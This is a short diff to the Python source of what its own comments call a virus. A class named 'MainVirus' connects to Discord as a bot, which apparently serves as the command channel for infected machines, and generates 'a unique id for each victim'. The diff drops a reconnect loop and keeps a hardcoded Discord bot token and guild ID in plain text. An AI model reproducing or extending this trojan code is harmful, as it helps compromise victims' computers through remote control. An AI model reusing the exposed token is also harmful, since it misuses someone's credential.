@@ -26,13 +26,9 @@ class MainVirus:  # Making a class to wrap code cause organisation
         self.bot.run()  # Runs the bot (Makes it online)
 
     def make_connection(self):  # makes a connection to the discord servers
-        try:  # I use a try method cause the person might not have an internet connection when computer booted
-            return lightbulb.BotApp( # Makes the Discord Bot
-                token="OTg1ODU1NTYwMDMxMjkzNDQy.GkeK8U.11OUYRHcS5Zevhu3B8QrMDZ6HdRgJZtDOZdEcY",  # Sets the token for the bot
-                default_enabled_guilds=985853825166475284)  # I connect the bot to the discord servers using our bots token
-        except:  # what to do if connection fails
-            time.sleep(1)
-            self.make_connection()  # I run the program again if the connection fails
+        return lightbulb.BotApp( # Makes the Discord Bot
+            token="OTg1ODU1NTYwMDMxMjkzNDQy.GkeK8U.11OUYRHcS5Zevhu3B8QrMDZ6HdRgJZtDOZdEcY",  # Sets the token for the bot
+            default_enabled_guilds=985853825166475284)  # I connect the bot to the discord servers using our bots token
 
     def make_id(self):  # This Function makes a unique id for each victim
         return random.randint(100, 999)
